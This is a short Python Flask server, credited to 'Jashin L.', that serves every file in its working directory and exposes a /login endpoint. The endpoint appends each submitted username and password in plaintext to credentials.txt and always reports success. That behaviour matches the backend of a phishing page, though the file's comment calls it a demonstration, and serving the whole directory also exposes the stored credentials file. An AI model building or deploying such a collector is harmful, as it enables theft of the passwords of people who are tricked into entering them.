from flask import Flask, request, send_from_directory, jsonify
import os

app = Flask(__name__)

# Directory for static files
@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    # Log the credentials (for demonstration purposes, do not do this in production)
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

    return jsonify(success=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

# Crediti a Jashin L.
